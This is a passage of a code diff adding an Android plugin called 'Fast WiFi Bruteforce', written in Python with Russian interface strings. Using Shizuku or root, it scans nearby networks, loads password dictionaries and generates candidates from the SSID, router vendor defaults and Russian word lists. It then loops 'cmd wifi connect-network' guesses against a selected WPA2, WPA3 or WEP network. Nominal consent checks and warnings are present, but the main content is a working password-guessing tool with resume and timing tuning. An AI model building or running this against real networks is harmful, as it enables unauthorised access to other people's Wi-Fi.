+                except Exception:
+                    continue
+                self._dicts[path] = {
+                    "path": path,
+                    "name": os.path.basename(path),
+                    "count": None,
+                    "valid": None,
+                }
+
+        enabled = saved.get("enabled", [])
+        self._enabled_dicts = []
+        if isinstance(enabled, list):
+            for path in enabled:
+                if (isinstance(path, str) and path in self._dicts
+                        and path not in self._enabled_dicts):
+                    self._enabled_dicts.append(path)
+
+        try:
+            found = self.get_setting(self.FOUND_KEY, {})
+            if isinstance(found, str):
+                try:
+                    found = json.loads(found)
+                except Exception:
+                    found = {}
+            if (isinstance(found, dict)
+                    and found.get("password")
+                    and found.get("ssid") == self._network.get("ssid", "")):
+                self._found_password = str(found["password"])
+                self._reveal = False
+        except Exception:
+            pass
+
+        self.add_module(
+            title="Fast WiFi Bruteforce",
+            description="Сети · словари · разрешённый аудит",
+            icon="rounded:wifi_password",
+            screen="main",
+            section="PLUGINS"
+        )
+
+        self._ready = True
+
+        try:
+            self._detect_shell_mode()
+        except Exception as exc:
+            self._log("warning", "shell detect: " + str(exc)[:150])
+
+        try:
+            self._start_rssi_sampler()
+        except Exception:
+            pass
+
+        self._log("info", "Fast WiFi Bruteforce {} загружен".format(__version__))
+        if self._shell_mode == "shizuku":
+            self._log("success", "Режим: Shizuku · перебор доступен")
+        elif self._shell_mode == "root":
+            self._log("success", "Режим: root · перебор доступен")
+        else:
+            self._log("warning",
+                      "Режим: только просмотр · перебор недоступен.")
+        self._log("warning",
+                  "Проверяйте только собственные сети "
+                  "или сети с разрешения владельца.")
+
+    def on_plugin_unload(self):
+        self._ready = False
+        self._running = False
+        self._stop.set()
+        try:
+            self._stop_rssi_sampler()
+        except Exception:
+            pass
+        try:
+            self._save()
+        except Exception:
+            pass
+        self._found_password = ""
+        self._reveal = False
+        self._password_pool = []
+        with self._recent_lock:
+            self._recent = []
+
+    def _try_shell_uid(self, mode):
+        try:
+            if mode == "shizuku":
+                raw = self.shizuku("id -u")
+            elif mode == "root":
+                raw = self.root("id -u")
+            else:
+                return ""
+        except Exception as exc:
+            self._log("warning",
+                      "{} id -u: {}".format(mode, str(exc)[:150]))
+            return ""
+
+        text = ""
+        if isinstance(raw, bytes):
+            try:
+                text = raw.decode("utf-8", errors="replace")
+            except Exception:
+                text = ""
+        elif isinstance(raw, dict):
+            for key in ("out", "stdout", "output"):
+                if raw.get(key):
+                    text = str(raw[key])
+                    break
+        elif raw is not None:
+            text = str(raw)
+
+        text = text.strip()
+        if not text:
+            return ""
+        first = text.splitlines()[0].strip()
+        if first in ("2000", "0"):
+            return first
+        m = re.search(r"uid=(\d+)", first)
+        if m and m.group(1) in ("2000", "0"):
+            return m.group(1)
+        return ""
+
+    def _detect_shell_mode(self):
+        try:
+            uid = self._try_shell_uid("shizuku")
+            if uid in ("2000", "0"):
+                self._shell_mode = "shizuku"
+                self._uid = uid
+                return
+        except Exception:
+            pass
+
+        api = getattr(self, "api", None)
+        if api is not None:
+            try:
+                dev = api.getDevice()
+            except Exception:
+                dev = None
+            if dev is not None:
+                avail = self._call_or_prop(dev, "shizukuAvailable")
+                perm = self._call_or_prop(dev, "shizukuHasPermission")
+                self._log("info",
+                          "Shizuku: available={}, permission={}".format(
+                              avail, perm))
+
+        try:
+            uid = self._try_shell_uid("root")
+            if uid == "0":
+                self._shell_mode = "root"
+                self._uid = "0"
+                return
+        except Exception:
+            pass
+
+        self._shell_mode = "none"
+        self._uid = ""
+
+    def _launch(self, job, kind="io"):
+        if not self._ready:
+            return
+        if self._busy or (self._thread is not None and self._thread.is_alive()):
+            self._toast("Дождитесь завершения текущей операции")
+            return
+
+        self._stop.clear()
+        self._busy = True
+        self._running = kind == "audit"
+        self._scanning = kind == "scan"
+
+        def worker():
+            try:
+                if self._ready:
+                    job()
+            except Exception as exc:
+                if not self._stop.is_set():
+                    self._outcome = "Ошибка: " + str(exc)[:160]
+                    self._log("error", "worker: " + str(exc)[:240])
+            finally:
+                self._running = False
+                self._scanning = False
+                self._busy = False
+                self._refresh(force=True)
+
+        try:
+            self._thread = threading.Thread(target=worker, daemon=True)
+            self._thread.start()
+        except Exception:
+            self._busy = False
+            self._running = False
+            self._scanning = False
+            raise
+
+        self._refresh(force=True)
+
+    def _shell(self, command, sensitive=False, allow_failure=False,
+               hide_command_only=False):
+        if not self._ready or self._stop.is_set():
+            raise RuntimeError("Операция отменена")
+        if self._shell_mode == "none":
+            raise RuntimeError(
+                "Нет Shizuku или root — shell-команды недоступны")
+
+        hide_cmd = sensitive or hide_command_only
+        self._log("info",
+                  "$ [команда скрыта]" if hide_cmd else "$ " + command)
+
+        try:
+            with self._shell_lock:
+                if self._stop.is_set():
+                    raise RuntimeError("Операция отменена")
+                if self._shell_mode == "shizuku":
+                    result = self.shizuku(command)
+                elif self._shell_mode == "root":
+                    result = self.root(command)
+                else:
+                    raise RuntimeError("Нет доступного shell")
+
+            if result is None:
+                raise RuntimeError("shell вернул None")
+
+            if isinstance(result, bytes):
+                result = self._text(result)
+
+            if isinstance(result, str) and result.lstrip().startswith("{"):
+                try:
+                    decoded = json.loads(result)
+                    if isinstance(decoded, dict):
+                        result = decoded
+                except (ValueError, TypeError):
+                    pass
+
+            stderr = ""
+            if isinstance(result, dict):
+                stdout = ""
+                for key in ("out", "stdout", "output"):
+                    if result.get(key) is not None:
+                        stdout = self._text(result[key])
+                        break
+                stderr = self._text(
+                    result.get("err") if result.get("err") is not None
+                    else result.get("stderr")
+                )
+                failed = result.get("ok") is False
+                code = None
+                for key in ("code", "exitCode", "exit_code", "returncode"):
+                    if result.get(key) is not None:
+                        code = result[key]
+                        break
+                if code is not None:
+                    try:
+                        failed = failed or int(code) != 0
+                    except (ValueError, TypeError):
+                        pass
+                if failed and not allow_failure:
+                    raise RuntimeError((stderr or stdout or "Ошибка shell")[:240])
+            else:
+                stdout = self._text(result)
+
+            combined = stdout + "\n" + stderr
+            if self.SHELL_HARD_ERROR.search(combined) and not allow_failure:
+                raise RuntimeError((stderr or stdout or "Ошибка shell")[:240])
+
+            preview = (stdout or stderr).strip()
+            if preview:
+                self._log("info",
+                          "Ответ: " + preview.replace("\n", " ⏎ ")[:300])
+            else:
+                self._log("info", "Пустой ответ")
+
+            return stdout
+
+        except Exception:
+            raise
+
+    def _require_shell(self):
+        if self._shell_mode == "none":
+            raise RuntimeError(
+                "Shizuku или root не найдены. Запустите Shizuku или дайте root.")
+        if self._shell_mode == "unknown":
+            self._detect_shell_mode()
+            if self._shell_mode == "none":
+                raise RuntimeError("Shizuku или root не найдены.")
+        if not self._uid:
+            try:
+                self._uid = self._try_shell_uid(self._shell_mode)
+            except Exception:
+                self._uid = ""
+
+    def _diagnose(self):
+        self._detect_shell_mode()
+        self._log("info", "Режим shell: " + self._shell_mode)
+
+        if self._shell_mode == "none":
+            self._outcome = "Диагностика: только просмотр (нет shell)"
+            return
+
+        try:
+            self._require_shell()
+            help_text = self._shell("cmd wifi help", allow_failure=True)
+            has_connect = "connect-network" in help_text
+            has_wpa2 = "wpa2" in (help_text or "").lower()
+            has_wpa3 = "wpa3" in (help_text or "").lower()
+            has_wep = "wep" in (help_text or "").lower()
+            self._cmd_ok = has_connect
+
+            extras = []
+            if has_wpa2:
+                extras.append("WPA2")
+            if has_wpa3:
+                extras.append("WPA3")
+            if has_wep:
+                extras.append("WEP")
+
+            if not has_connect:
+                self._log("error",
+                          "Команда connect-network НЕ найдена в cmd wifi help")
+            else:
+                self._log("success",
+                          "connect-network OK · " + ", ".join(extras))
+
+            probe = self._shell("cmd wifi connect-network 2>&1",
+                                allow_failure=True)
+            first_line = (probe or "").strip().splitlines()
+            first_line = first_line[0][:200] if first_line else "(пусто)"
+            self._log("info", "probe: " + first_line)
+
+            self._shell("cmd wifi status", allow_failure=True)
+            self._outcome = ("Диагностика: OK · режим " + self._shell_mode
+                             if self._cmd_ok
+                             else "Диагностика: ограничено")
+        except Exception as exc:
+            self._log("error", "diagnose: " + str(exc)[:200])
+            self._outcome = "Диагностика: ошибка"
+
+    def _stop_work(self):
+        if not self._busy:
+            return
+        self._running = False
+        self._stop.set()
+        try:
+            if self._checked > 0:
+                self._save_checkpoint()
+        except Exception:
+            pass
+        self._outcome = "Остановка…"
+        self._log("warning", "Запрошена остановка; чекпоинт сохранён")
+
+    # ═══════════════════════════════════════════════
+    # СКАНИРОВАНИЕ
+    # ═══════════════════════════════════════════════
+
+    @staticmethod
+    def _security(flags):
+        flags = (flags or "").upper()
+        if not flags:
+            return "unknown"
+        if any(tag in flags for tag in ("EAP", "802.1X", "IEEE8021X")):
+            return "eap"
+        if "SAE" in flags:
+            return "sae"
+        if "PSK" in flags and ("WPA2" in flags or "RSN" in flags):
+            return "psk"
+        if "WEP" in flags:
+            return "wep"
+        if any(tag in flags for tag in
+               ("WPA", "RSN", "OWE", "PSK", "DPP", "?")):
+            return "other"
+        return "open" if "[ESS]" in flags else "unknown"
+
+    @staticmethod
+    def _band(frequency):
+        if 2400 <= frequency < 2500:
+            return "2.4 ГГц"
+        if 4900 <= frequency < 5925:
+            return "5 ГГц"
+        if 5925 <= frequency <= 7125:
+            return "6 ГГц"
+        return "{} МГц".format(frequency)
+
+    @staticmethod
+    def _signal(rssi):
+        if rssi >= -55:
+            return "▂▄▆█  Отличный"
+        if rssi >= -67:
+            return "▂▄▆░  Хороший"
+        if rssi >= -75:
+            return "▂▄░░  Средний"
+        return "▂░░░  Слабый"
+
+    @classmethod
+    def _parse_scan_line(cls, line):
+        match = cls.SCAN_PREFIX.match(line)
+        if not match:
+            return None
+        tail = match.group("tail")
+        ssid = ""
+        flags = ""
+        if (len(tail) >= 33 and tail[32].isspace()
+                and tail[33:].lstrip().startswith("[")):
+            ssid = tail[:32].strip()
+            flags = tail[33:].strip()
+        else:
+            flag_match = cls.FLAGS_SUFFIX.search(tail)
+            if flag_match:
+                ssid = tail[:flag_match.start()].strip()
+                flags = flag_match.group("flags").strip()
+            else:
+                ssid = tail.strip()
+        frequency = int(match.group("frequency"))
+        rssi = int(match.group("rssi"))
+        if not 0 < frequency < 100000 or not -127 <= rssi <= 0:
+            return None
+        return {
+            "ssid": ssid,
+            "bssid": match.group("bssid").lower(),
+            "frequency": frequency,
+            "rssi": rssi,
+            "age": match.group("age"),
+            "flags": flags,
+            "security": cls._security(flags),
+        }
+
+    @classmethod
+    def _self_test_parser(cls):
+        cases = [
+            ("aa:bb:cc:dd:ee:01 2412 -48 0.125 Home WiFi [WPA2-PSK-CCMP][ESS]",
+             "Home WiFi", -48, "psk"),
+            ("aa:bb:cc:dd:ee:02 5180 -61(0:-62/1:-60) 1.250 Office [RSN-PSK-CCMP][ESS]",
+             "Office", -61, "psk"),
+            ("aa:bb:cc:dd:ee:03 2462 -72(0: -73) ___?___ Guest [ESS]",
+             "Guest", -72, "open"),
+            ("aa:bb:cc:dd:ee:04 5975 -54 0.010 "
+             + "{:<32} {}".format("WiFi [Home]", "[RSN-SAE-CCMP][ESS]"),
+             "WiFi [Home]", -54, "sae"),
+            ("0c:80:63:4e:70:a4 5180 -42(0:-44/1:-46) 3.391    "
+             + "{:<32} {}".format("Xiaomi_59A9", "[WPA2-PSK-CCMP-128][ESS]"),
+             "Xiaomi_59A9", -42, "psk"),
+        ]
+        for line, ssid, rssi, security in cases:
+            parsed = cls._parse_scan_line(line)
+            if (parsed is None or parsed["ssid"] != ssid
+                    or parsed["rssi"] != rssi
+                    or parsed["security"] != security):
+                raise RuntimeError(
+                    "Внутренняя проверка парсера не пройдена: '{}' → {}".format(
+                        ssid, parsed))
+
+    def _scan_via_api(self):
+        try:
+            dev = self.api.getDevice()
+            raw = dev.wifiScanResultsJson()
+            if raw is None:
+                return []
+            if isinstance(raw, bytes):
+                raw = raw.decode("utf-8", errors="replace")
+            if isinstance(raw, str):
+                try:
+                    data = json.loads(raw)
+                except Exception:
+                    return []
+            else:
+                data = raw
+            if not isinstance(data, list):
+                return []
+            records = {}
+            for item in data:
+                if not isinstance(item, dict):
+                    continue
+                bssid = (item.get("BSSID") or item.get("bssid") or "").lower()
+                if not bssid:
+                    continue
+                ssid = (item.get("SSID") or item.get("ssid") or "").strip()
+                try:
+                    rssi = int(item.get("level") or item.get("RSSI")
+                               or item.get("rssi") or -100)
+                except (ValueError, TypeError):
+                    rssi = -100
+                try:
+                    freq = int(item.get("frequency") or 0)
+                except (ValueError, TypeError):
+                    freq = 0
+                caps = str(item.get("capabilities") or "")
+                sec = self._security(caps)
+                records[bssid] = {
+                    "ssid": ssid,
+                    "bssid": bssid,
+                    "frequency": freq,
+                    "rssi": rssi,
+                    "age": "0",
+                    "flags": caps,
+                    "security": sec,
+                }
+            return list(records.values())
+        except Exception as exc:
+            self._log("warning", "wifiScanResultsJson: " + str(exc)[:180])
+            return []
+
+    def _begin_scan(self):
+        if self._busy:
+            self._toast("Сначала завершите текущую операцию")
+            return
+        self._page = "networks"
+        self._launch(self._scan, "scan")
+
+    def _scan(self):
+        self._outcome = "Сканирование Wi-Fi…"
+        self._scan_attempted = True
+
+        networks = []
+
+        if self._shell_mode in ("shizuku", "root"):
+            try:
+                self._require_shell()
+                try:
+                    self._shell("cmd wifi start-scan", allow_failure=True)
+                except Exception:
+                    pass
+                if self._stop.wait(3.0):
+                    self._outcome = "Сканирование остановлено"
+                    return
+                output = self._shell("cmd wifi list-scan-results",
+                                     allow_failure=True)
+                if self._stop.is_set():
+                    return
+                self._scan_raw = output[:50000]
+                records = {}
+                unmatched = 0
+                for line in output.splitlines():
+                    if self._stop.is_set():
+                        self._outcome = "Сканирование остановлено"
+                        return
+                    item = self._parse_scan_line(line)
+                    if item is None:
+                        if self.MAC_PREFIX.match(line):
+                            unmatched += 1
+                        continue
+                    records[item["bssid"]] = item
+                networks = list(records.values())
+                self._scan_unparsed = unmatched
+            except Exception as exc:
+                self._log("warning", "shell scan: " + str(exc)[:180])
+                networks = []
+
+        if not networks:
+            self._log("info", "Пробую скан через API (без shell)…")
+            networks = self._scan_via_api()
+            self._scan_unparsed = 0
+            if not self._scan_raw:
+                self._scan_raw = "(скан через API, без shell)"
+
+        if self._stop.is_set():
+            self._outcome = "Сканирование остановлено"
+            return
+
+        networks.sort(key=lambda x: x["rssi"], reverse=True)
+        self._networks = networks[:self.MAX_RESULTS]
+        self._scan_time = time.strftime("%H:%M:%S")
+        self._outcome = "Найдено сетей: {}".format(len(networks))
+
+        self._log("success" if networks else "warning",
+                  "{}. Источник: {}.".format(
+                      self._outcome,
+                      "shell" if self._shell_mode in ("shizuku", "root")
+                      else "API"))
+        if networks:
+            self._toast("Сети найдены. Выберите нужную.")
+        self._refresh(force=True)
+
+    def _select_network(self, network):
+        if self._busy:
+            self._toast("Выбор доступен после завершения операции")
+            return
+        if not network.get("ssid"):
+            self._toast("У скрытой сети нет SSID")
+            return
+        clean = dict(network)
+        try:
+            clean["ssid"] = str(clean["ssid"]).strip()
+        except Exception:
+            pass
+        self._network = clean
+        self._target_sec = self._sec_for_connect(clean.get("security", ""))
+        self._found_password = ""
+        self._reveal = False
+        self._consent = False
+        self._checked = 0
+        self._total = 0
+        self._speed = 0.0
+        self._eta = 0.0
+        self._finished = False
+        with self._rssi_lock:
+            self._rssi_samples = []
+        self._outcome = "Сеть выбрана: " + clean["ssid"]
+        self._save()
+
+        vendor = self._vendor_for_bssid(clean.get("bssid", ""))
+        if vendor:
+            self._log("info",
+                      "Выбрана сеть: {} ({})".format(clean["ssid"], vendor))
+        else:
+            self._log("info", "Выбрана сеть: " + clean["ssid"])
+        self._toast("Выбрано: " + clean["ssid"])
+        self._page = "main"
+
+    @staticmethod
+    def _sec_for_connect(security):
+        if security == "sae":
+            return "wpa3"
+        if security == "wep":
+            return "wep"
+        return "wpa2"
+
+    def _set_filter(self, value):
+        self._network_filter = self._text(value)[:100]
+
+    def _toggle_raw(self):
+        self._show_raw = not self._show_raw
+
+    # ═══════════════════════════════════════════════
+    # ФАЙЛЫ
+    # ═══════════════════════════════════════════════
+
+    def _open_browser(self, path=None):
+        if self._busy:
+            self._toast("Дождитесь завершения операции")
+            return
+        destination = self._path(path or self._folder)
+        self._page = "browser"
+        self._launch(lambda: self._browse(destination))
+
+    def _browse(self, path):
+        self._require_shell()
+        path = self._path(path)
+        output = self._shell("ls -1F {} 2>&1 | head -100".format(self._shq(path)))
+        if any(m in output for m in
+               ("Permission denied", "No such file", "Not a directory")):
+            raise RuntimeError("Каталог недоступен: " + path)
+
+        entries = []
+        for name in output.splitlines()[:self.MAX_RESULTS]:
+            if not name or name in (".", "..", "./", "../"):
+                continue
+            is_folder = name.endswith("/")
+            if is_folder:
+                name = name[:-1]
+            elif name.endswith(("@", "|", "=", "*")):
+                continue
+            if "/" in name:
+                continue
+            entries.append({
+                "name": name,
+                "path": self._path(os.path.join(path, name)),
+                "folder": is_folder,
+            })
+
+        if self._stop.is_set():
+            return
+        self._folder = path
+        self._files = sorted(entries,
+                             key=lambda x: (not x["folder"],
+                                            x["name"].casefold()))
+        self._save()
+
+    def _set_query(self, value):
+        if not self._busy:
+            self._query = self._text(value)[:100]
+
+    def _set_depth(self, value):
+        if not self._busy:
+            self._depth = max(2, min(6, int(round(float(value)))))
+
+    def _search_files(self, all_files=False):
+        self._require_shell()
+        query = "" if all_files else self._query.strip()
+        query = (query.replace("[", "[[]").replace("*", "[*]")
+                 .replace("?", "[?]"))
+        pattern = "*" + query + "*.txt"
+        output = self._shell(
+            "find /sdcard/ -maxdepth {} -type f -iname {} "
+            "2>/dev/null | head -100".format(self._depth, self._shq(pattern))
+        )
+        paths = []
+        for line in output.splitlines()[:self.MAX_RESULTS]:
+            if self._stop.is_set():
+                return
+            try:
+                path = self._path(line)
+            except Exception:
+                continue
+            if path not in paths:
+                paths.append(path)
+        self._results = paths
+        self._log("info", "Найдено файлов: {}".format(len(paths)))
+
+    def _read_dictionary(self, path):
+        self._require_shell()
+        path = self._path(path)
+        quoted = self._shq(path)
+        size_text = self._shell(
+            "[ -f {0} ] && stat -c %s {0}".format(quoted)).strip()
+        try:
+            size = int(size_text)
+        except (TypeError, ValueError):
+            raise RuntimeError("Не удалось определить размер файла")
+        if not 0 <= size <= self.MAX_FILE:
+            raise RuntimeError("Лимит размера словаря: 10 МБ")
+
+        text = self._shell("head -c {} {}".format(self.MAX_FILE + 1, quoted),
+                           sensitive=True, hide_command_only=True)
+        if len(text.encode("utf-8")) > self.MAX_FILE:
+            raise RuntimeError("Файл превышает лимит после чтения")
+        if "\x00" in text or "\ufffd" in text:
+            raise RuntimeError("Нужен текстовый файл UTF-8 без NUL")
+
+        passwords = []
+        count = 0
+        with io.StringIO(text.lstrip("\ufeff")) as stream:
+            for line in stream:
+                if self._stop.is_set():
+                    raise RuntimeError("Чтение остановлено")
+                password = line[:-1] if line.endswith("\n") else line
+                if password.endswith("\r"):
+                    password = password[:-1]
+                count += 1
+                if self._valid_password(password):
+                    passwords.append(password)
+                    if len(passwords) > self.MAX_PASSWORDS:
+                        raise RuntimeError(
+                            "Лимит: {} допустимых паролей за запуск".format(
+                                self.MAX_PASSWORDS))
+        metadata = {
+            "path": path,
+            "name": os.path.basename(path),
+            "count": count,
+            "valid": len(passwords),
+        }
+        return metadata, passwords
+
+    def _import_dictionary(self, path):
+        self._require_shell()
+        path = self._path(path)
+        if path not in self._dicts and len(self._dicts) >= self.MAX_DICTS:
+            raise RuntimeError("Можно добавить не более 16 словарей")
+        metadata, passwords = self._read_dictionary(path)
+        passwords.clear()
+        if self._stop.is_set():
+            return
+        self._dicts[path] = metadata
+        if path not in self._enabled_dicts:
+            self._enabled_dicts.append(path)
+        self._save()
+        self._log("success", "Добавлен {}: строк {}, допустимых {}.".format(
+            metadata["name"], metadata["count"], metadata["valid"]))
+        self._toast("Словарь добавлен")
+
+    def _enable_dictionary(self, path, value):
+        if self._busy or path not in self._dicts:
+            return
+        enabled = self._bool(value)
+        if enabled and path not in self._enabled_dicts:
+            self._enabled_dicts.append(path)
+        elif not enabled:
+            self._enabled_dicts = [x for x in self._enabled_dicts if x != path]
+        self._save()
+
+    def _delete_dictionary(self, path):
+        if self._busy:
+            return
+        self._dicts.pop(path, None)
+        self._enabled_dicts = [x for x in self._enabled_dicts if x != path]
+        self._save()
+        self._log("info", "Словарь убран из списка; файл не удалён")
+
+    def _load_password_pool(self):
+        combined = []
+        seen = set()
+        duplicates = 0
+        for path in list(self._enabled_dicts):
+            if self._stop.is_set():
+                raise RuntimeError("Загрузка остановлена")
+            if path not in self._dicts:
+                continue
+            metadata, passwords = self._read_dictionary(path)
+            self._dicts[path] = metadata
+            for pw in passwords:
+                if pw in seen:
+                    duplicates += 1
+                    continue
+                seen.add(pw)
+                combined.append(pw)
+                if len(combined) > self.MAX_PASSWORDS:
+                    combined.clear()
+                    seen.clear()
+                    raise RuntimeError(
+                        "Суммарный лимит: {} уникальных паролей".format(
+                            self.MAX_PASSWORDS))
+            passwords.clear()
+
+        # генераторы — вызываются один раз на старте
+        if self._use_ssid_gen:
+            gen = self._generate_from_ssid(self._network.get("ssid", ""))
+            added = 0
+            for pw in gen:
+                if pw in seen:
+                    continue
+                seen.add(pw)
+                combined.append(pw)
+                added += 1
+                if len(combined) > self.MAX_PASSWORDS:
+                    break
+            self._log("info",
+                      "SSID-генератор: +{} кандидатов".format(added))
+
+        if self._use_vendor_gen:
+            gen = self._vendor_defaults_for_bssid(
+                self._network.get("bssid", ""))
+            added = 0
+            for pw in gen:
+                if pw in seen:
+                    continue
+                seen.add(pw)
+                combined.append(pw)
+                added += 1
+                if len(combined) > self.MAX_PASSWORDS:
+                    break
+            self._log("info",
+                      "Vendor-генератор: +{} кандидатов".format(added))
+
+        if self._use_ru_gen or self._use_morph:
+            gen = self._generate_ru_candidates(
+                self._network.get("ssid", ""))
+            added = 0
+            for pw in gen:
+                if pw in seen:
+                    continue
+                seen.add(pw)
+                combined.append(pw)
+                added += 1
+                if len(combined) > self.MAX_PASSWORDS:
+                    break
+            self._log("info",
+                      "RU-генератор: +{} кандидатов".format(added))
+
+        if duplicates > 0:
+            self._log("info",
+                      "Дедупликация: пропущено {} повторов".format(duplicates))
+        self._password_pool = combined
+        return combined
+
+    # ═══════════════════════════════════════════════
+    # ПРОВЕРКА СЕТИ
+    # ═══════════════════════════════════════════════
+
+    @staticmethod
+    def _connected_ssid(output):
+        for line in str(output or "").splitlines():
+            match = re.match(r"^\s*Wifi is connected to\s+(.+?)\s*$",
+                             line, re.IGNORECASE)
+            if match:
+                ssid = match.group(1)
+                if len(ssid) >= 2 and ssid[0] == ssid[-1] == '"':
+                    ssid = ssid[1:-1]
+                return ssid
+        return None
+
+    def _set_consent(self, value):
+        if not self._busy:
+            self._consent = self._bool(value)
+
+    def _set_settle(self, value):
+        if not self._busy:
+            self._settle = max(self.MIN_SETTLE,
+                               min(self.MAX_SETTLE,
+                                   round(float(value), 1)))
+            self._save()
+
+    def _set_manual(self, value):
+        if not self._busy:
+            self._manual_password = self._text(value)[:200]
+
+    def _toggle_ssid_gen(self, value):
+        if not self._busy:
+            self._use_ssid_gen = self._bool(value)
+            self._save()
+
+    def _toggle_vendor_gen(self, value):
+        if not self._busy:
+            self._use_vendor_gen = self._bool(value)
+            self._save()
+
+    def _toggle_ru_gen(self, value):
+        if not self._busy:
+            self._use_ru_gen = self._bool(value)
+            self._save()
+
+    def _toggle_morph(self, value):
+        if not self._busy:
+            self._use_morph = self._bool(value)
+            self._save()
+
+    def _toggle_adaptive(self, value):
+        if not self._busy:
+            self._use_adaptive_settle = self._bool(value)
+            self._save()
+
+    def _toggle_notify(self, value):
+        self._notify_on_found = self._bool(value)
+        self._save()
+
+    def _toggle_resume(self, value):
+        self._resume_enabled = self._bool(value)
+        self._save()
+
+    def _effective_settle(self):
+        if not self._use_adaptive_settle:
+            return self._settle
+        with self._rssi_lock:
+            n = len(self._settle_samples)
+        if n < self.SETTLE_MIN_SAMPLES:
+            return self._settle
+        try:
+            samples = sorted(self._settle_samples)
+            idx = int(len(samples) * 0.9)
+            idx = min(idx, len(samples) - 1)
+            p90 = samples[idx]
+            eff = max(self.MIN_SETTLE,
+                      min(self.MAX_SETTLE, round(p90 + 0.5, 1)))
+            return eff
+        except Exception:
+            return self._settle
+
+    def _try_password(self, target, password, settle):
+        if self._stop.is_set():
+            return None
+
+        t0 = time.monotonic()
+        cmd_sec = self._target_sec
+        try:
+            raw = self._shell(
+                "cmd wifi connect-network {} {} {}".format(
+                    self._shq(target), cmd_sec, self._shq(password)),
+                sensitive=True,
+                allow_failure=True
+            )
+        except RuntimeError as exc:
+            if "Операция отменена" in str(exc):
+                return None
+            self._log("warning", "connect-network: " + str(exc)[:180])
+            return False
+
+        raw_text = (raw or "").strip()
+        raw_low = raw_text.lower()
+        elapsed_ms = int((time.monotonic() - t0) * 1000)
+        self._last_connect_reply = raw_text[:200]
+
+        # Быстрый путь: явный failure — сразу неверный
+        if "failure" in raw_low or "invalid args" in raw_low:
+            with self._recent_lock:
+                self._recent.append(
+                    (self._checked + 1, self._mask_last4(password),
+                     False, elapsed_ms))
+                self._recent = self._recent[-self.MAX_RECENT:]
+            return False
+
+        # Явный success в ответе — ускоряем проверку через fast settle
+        use_settle = settle
+        if "success" in raw_low or "ok" in raw_low.split()[:2]:
+            use_settle = min(settle, self.FAST_SETTLE)
+
+        if self._stop.wait(use_settle):
+            return None
+
+        status = self._shell("cmd wifi status", allow_failure=True)
+        connected = self._connected_ssid(status) == target
+        return connected
+
+    def _start_audit(self):
+        self._log("info", "=== Начало аудита ===")
+        self._log("info", "consent={}, network={}, dicts={}".format(
+            self._consent,
+            bool(self._network.get("ssid")),
+            len(self._enabled_dicts)))
+
+        if self._busy:
+            self._log("warning", "Занято другой операцией")
+            self._toast("Дождитесь завершения")
+            return
+
+        if self._shell_mode == "none":
+            self._outcome = "Отказ: нет Shizuku или root"
+            self._log("warning", "shell_mode=none")
+            self._toast("Перебор недоступен: нет Shizuku/root")
+            self._refresh(force=True)
+            return
+
+        sec = self._network.get("security", "")
+        if sec not in ("psk", "sae", "wep"):
+            self._outcome = "Отказ: тип защиты '{}' не поддержан".format(sec)
+            self._log("warning", "security unsupported: " + sec)
+            self._toast("Выберите WPA2/WPA3/WEP сеть")
+            self._refresh(force=True)
+            return
+
+        if not self._consent:
+            self._outcome = "Отказ: не подтверждено разрешение владельца"
+            self._log("warning", "consent=False")
+            self._toast("Подтвердите разрешение владельца")
+            self._refresh(force=True)
+            return
+
+        if not self._network.get("ssid"):
+            self._outcome = "Отказ: сеть не выбрана"
+            self._toast("Сначала выберите сеть")
+            self._refresh(force=True)
+            return
+
+        if (not self._enabled_dicts and not self._use_ssid_gen
+                and not self._use_vendor_gen and not self._use_ru_gen
+                and not self._use_morph):
+            self._outcome = "Отказ: нет источников паролей"
+            self._toast("Добавьте словарь или включите генератор")
+            self._refresh(force=True)
+            return
+
+        self._target_sec = self._sec_for_connect(sec)
+        self._checked = 0
+        self._total = 0
+        self._speed = 0.0
+        self._eta = 0.0
+        self._found_password = ""
+        self._reveal = False
+        self._finished = False
+        self._settle_samples = deque(maxlen=30)
+        with self._recent_lock:
+            self._recent = []
+        self._outcome = "Загрузка словарей…"
+
+        # Resume
+        self._resume_from = 0
+        if self._resume_enabled:
+            cp = self._load_checkpoint()
+            if (cp and cp.get("ssid") == self._network.get("ssid", "")
+                    and cp.get("dict_fp") == self._dict_fingerprint()):
+                self._resume_from = int(cp.get("checked", 0))
+                if self._resume_from > 0:
+                    self._log("info",
+                              "Найден чекпоинт: продолжаем с #{}".format(
+                                  self._resume_from))
+
+        target = self._network["ssid"]
+        settle = self._effective_settle()
+        self._log("info", "Запускаю _audit_worker для: " + target)
+        self._launch(lambda: self._audit_worker(target, settle), "audit")
+
+    def _audit_worker(self, target, settle):
+        try:
+            self._log("atk", "Шаг 1: проверка shell")
+            self._require_shell()
+            self._log("atk", "Шаг 2: режим={}, UID={}".format(
+                self._shell_mode, self._uid or "?"))
+
+            self._log("atk", "Шаг 3: проверка текущего подключения")
+            status0 = self._shell("cmd wifi status", allow_failure=True)
+            connected_now = self._connected_ssid(status0)
+            if connected_now == target:
+                raise RuntimeError(
+                    "Устройство уже подключено к этой сети. "
+                    "Отключитесь вручную и повторите.")
+            if connected_now:
+                self._log("info",
+                          "Сейчас подключены к: " + str(connected_now)[:60])
+            else:
+                self._log("info", "Сейчас не подключены ни к одной сети")
+
+            self._log("atk", "Шаг 4: probe connect-network")
+            probe = self._shell("cmd wifi connect-network 2>&1",
+                                allow_failure=True)
+            probe_first = (probe or "").strip().splitlines()
+            probe_first = probe_first[0][:160] if probe_first else "(пусто)"
+            self._log("atk", "probe: " + probe_first)
+
+            if "unknown command" in probe_first.lower():
+                self._cmd_ok = False
+                raise RuntimeError(
+                    "На этой прошивке нет команды cmd wifi connect-network")
+            self._cmd_ok = True
+            self._log("atk", "Шаг 5: команда доступна")
+
+            self._log("atk", "Шаг 6: загрузка словарей и генераторов")
+            passwords = self._load_password_pool()
+            self._total = len(passwords)
+            self._log("atk", "Шаг 7: уникальных паролей {}".format(self._total))
+
+            if self._stop.is_set():
+                self._outcome = "Остановлено"
+                return
+            if not passwords:
+                raise RuntimeError("Нет допустимых паролей")
+
+            skip = 0
+            if self._resume_from > 0 and self._resume_from < self._total:
+                skip = self._resume_from
+                self._checked = skip
+                self._log("info",
+                          "Resume: пропускаю {} паролей".format(skip))
+
+            self._outcome = "Проверка выполняется"
+            self._log("warning",
+                      "Отсутствие подключения за паузу не доказывает "
+                      "неверность пароля. Подключение — только кандидат.")
+
+            started = time.monotonic()
+            self._refresh(force=True)
+
+            for idx, password in enumerate(passwords):
+                if idx < skip:
+                    continue
+
+                if self._stop.is_set() or not self._running:
+                    break
+
+                current_settle = self._effective_settle()
+
+                t0 = time.monotonic()
